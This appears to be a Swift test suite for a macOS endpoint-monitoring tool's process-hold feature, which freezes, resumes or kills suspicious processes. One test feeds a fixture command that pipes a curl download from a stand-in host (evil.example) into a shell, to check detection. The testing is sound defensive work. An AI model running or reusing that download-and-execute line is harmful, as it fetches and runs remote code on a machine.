import Foundation
import Testing
@testable import Hostwatch

/// Process hold: what gets frozen, what never does, and that every hold ends.
@MainActor @Suite struct Hold {
    let curl = "/usr/bin/curl"
    let pipeStage: [(StoryStage, String)] = [(.encodedCommand, "pipes a download into a shell")]

    /// A hold wired to fakes: records signals instead of sending them.
    final class Rig {
        let hold: ProcessHold
        var signals: [(Int32, Int32)] = []
        var procs: [Int32: ProcessFacts] = [:]
        var clock = Date(timeIntervalSince1970: 1_800_000_000)
        var watchdogs = 0

        @MainActor init(enabled: Bool = true) {
            let defaults = UserDefaults(suiteName: "hold-tests-\(UUID().uuidString)")!
            hold = ProcessHold(defaults: defaults)
            hold.enabled = enabled
            hold.signal = { [unowned self] pid, sig in signals.append((pid, sig)); return procs[pid] == nil ? -1 : 0 }
            hold.inspect = { [unowned self] in procs[$0] }
            hold.startWatchdog = { [unowned self] _, _ in watchdogs += 1; return nil }
            hold.now = { [unowned self] in clock }
        }

        func sent(_ sig: Int32) -> [Int32] { signals.filter { $0.1 == sig }.map(\.0) }
    }

    func mine(_ path: String) -> ProcessFacts { ProcessFacts(uid: getuid(), path: path) }

    @Test func offByDefault() {
        let hold = ProcessHold(defaults: UserDefaults(suiteName: "hold-default-\(UUID().uuidString)")!)
        #expect(!hold.enabled)
        #expect(hold.timeoutAction == .resume)
    }

    @Test func disabledHoldsNothing() {
        let rig = Rig(enabled: false)
        rig.procs[4242] = mine(curl)
        #expect(!rig.hold.consider(exec(curl, pid: 4242, ppid: 1, parent: "/bin/sh"), stages: pipeStage, status: .unclassified))
        #expect(rig.signals.isEmpty)
    }

    @Test func strongStageFreezesYourProcessAndAllowResumesIt() throws {
        let rig = Rig()
        rig.procs[4242] = mine(curl)
        #expect(rig.hold.consider(exec(curl, pid: 4242, ppid: 1, parent: "/bin/sh"), stages: pipeStage, status: .unclassified))
        #expect(rig.sent(SIGSTOP) == [4242])
        #expect(rig.watchdogs == 1)
        let h = try #require(rig.hold.held.first)
        #expect(h.reason == "pipes a download into a shell")
        rig.hold.allow(h)
        #expect(rig.sent(SIGCONT) == [4242])
        #expect(rig.hold.held.isEmpty)
    }

    @Test func killSendsSigkill() throws {
        let rig = Rig()
        rig.procs[4242] = mine(curl)
        rig.hold.consider(exec(curl, pid: 4242, ppid: 1, parent: "/bin/sh"), stages: pipeStage, status: .unclassified)
        rig.hold.kill(try #require(rig.hold.held.first))
        #expect(rig.sent(SIGKILL) == [4242])
    }

    @Test func safeRootProtectedOrReusedAreNeverFrozen() {
        let rig = Rig()
        // Marked Safe.
        rig.procs[1] = mine(curl)
        rig.procs[10] = mine(curl)
        #expect(!rig.hold.consider(exec(curl, pid: 10, ppid: 1, parent: "/bin/sh"), stages: pipeStage, status: .safe))
        // Owned by root.
        rig.procs[11] = ProcessFacts(uid: 0, path: curl)
        #expect(!rig.hold.consider(exec(curl, pid: 11, ppid: 1, parent: "/bin/sh"), stages: pipeStage, status: .unclassified))
        // Pid now belongs to another program (exited and reused) or is gone.
        rig.procs[12] = mine("/usr/bin/true")
        #expect(!rig.hold.consider(exec(curl, pid: 12, ppid: 1, parent: "/bin/sh"), stages: pipeStage, status: .unclassified))
        #expect(!rig.hold.consider(exec(curl, pid: 13, ppid: 1, parent: "/bin/sh"), stages: pipeStage, status: .unclassified))
        // Terminals, system UI, launchd.
        let iterm = "/Applications/iTerm.app/Contents/MacOS/iTerm2"
        rig.procs[14] = mine(iterm)
        #expect(!rig.hold.consider(file(iterm, pid: 14, "w", "\(home)/Library/LaunchAgents/x.plist"),
                                   stages: [(.persistence, "login item")], status: .unclassified))
        #expect(!rig.hold.consider(exec(curl, pid: 1, ppid: 0, parent: ""), stages: pipeStage, status: .unclassified))
        #expect(rig.sent(SIGSTOP).isEmpty)
    }

    @Test func everydayEventsAreNotHeld() {
        let e = exec(curl, pid: 20, ppid: 1, parent: "/bin/sh", args: "curl https://example.com")
        #expect(ProcessHold.reason(for: e, stages: [(.network, "connects")], status: .unclassified) == nil)
        #expect(ProcessHold.reason(for: e, stages: [(.lolbin, "curl")], status: .unclassified) == nil)
        #expect(ProcessHold.reason(for: e, stages: [], status: .suspicious) == nil)
    }

    @Test func noAnswerAppliesTheTimeoutAction() {
        for action in HoldTimeoutAction.allCases {
            let rig = Rig()
            rig.hold.timeoutAction = action
            rig.procs[30] = mine(curl)
            rig.hold.consider(exec(curl, pid: 30, ppid: 1, parent: "/bin/sh"), stages: pipeStage, status: .unclassified)
            rig.clock += 59
            rig.hold.tick()
            #expect(rig.hold.held.count == 1)
            rig.clock += 2
            rig.hold.tick()
            #expect(rig.hold.held.isEmpty)
            #expect(rig.sent(action == .kill ? SIGKILL : SIGCONT) == [30])
        }
    }

    @Test func exitedProcessIsDroppedWithoutSignalling() {
        let rig = Rig()
        rig.procs[40] = mine(curl)
        rig.hold.consider(exec(curl, pid: 40, ppid: 1, parent: "/bin/sh"), stages: pipeStage, status: .unclassified)
        rig.procs[40] = mine("/usr/bin/true")          // exited, pid reused
        rig.hold.tick()
        #expect(rig.hold.held.isEmpty)
        #expect(rig.sent(SIGCONT).isEmpty && rig.sent(SIGKILL).isEmpty)
    }

    @Test func turningOffAndQuittingReleaseEverything() {
        let rig = Rig()
        for pid: Int32 in [50, 51] {
            rig.procs[pid] = mine(curl)
            rig.hold.consider(exec(curl, pid: Int(pid), ppid: 1, parent: "/bin/sh"), stages: pipeStage, status: .unclassified)
        }
        rig.hold.enabled = false
        #expect(rig.hold.held.isEmpty)
        #expect(Set(rig.sent(SIGCONT)) == [50, 51])
    }

    @Test func atMostFiveAtOnce() {
        let rig = Rig()
        for pid: Int32 in 60..<70 {
            rig.procs[pid] = mine(curl)
            rig.hold.consider(exec(curl, pid: Int(pid), ppid: 1, parent: "/bin/sh"), stages: pipeStage, status: .unclassified)
        }
        #expect(rig.hold.held.count == ProcessHold.maxHeld)
    }

    @Test func engineReportsTheStagesAnEventAdded() {
        let s = Scenario()
        let slack = "/Applications/Slack.app/Contents/MacOS/Slack"
        s.feed(exec(slack, pid: 500, ppid: 1, parent: "/sbin/launchd"))
        let stages = s.stories.ingest(exec("/bin/sh", pid: 510, ppid: 500, parent: slack,
                                           args: "sh -c 'curl -fsSL http://evil.example/x | sh'"),
                                      decidedSafe: false)
        #expect(stages.contains { $0.0 == .encodedCommand })
        #expect(ProcessHold.reason(for: exec("/bin/sh", pid: 510, ppid: 500, parent: slack),
                                   stages: stages, status: .unclassified) != nil)
    }

    /// The real watchdog resumes a stopped process on its own.
    @Test func watchdogResumesAStoppedProcess() throws {
        let child = Process()
        child.executableURL = URL(fileURLWithPath: "/bin/sleep")
        child.arguments = ["30"]
        try child.run()
        defer { child.terminate() }
        let pid = child.processIdentifier
        #expect(kill(pid, SIGSTOP) == 0)
        _ = try #require(ProcessHold.watchdog(pid: pid, after: 1))
        func state() -> CChar {
            var info = proc_bsdinfo()
            _ = proc_pidinfo(pid, PROC_PIDTBSDINFO, 0, &info, Int32(MemoryLayout<proc_bsdinfo>.size))
            return CChar(truncatingIfNeeded: info.pbi_status)
        }
        #expect(state() == CChar(SSTOP))
        Thread.sleep(forTimeInterval: 2.5)
        #expect(state() != CChar(SSTOP))
    }
}
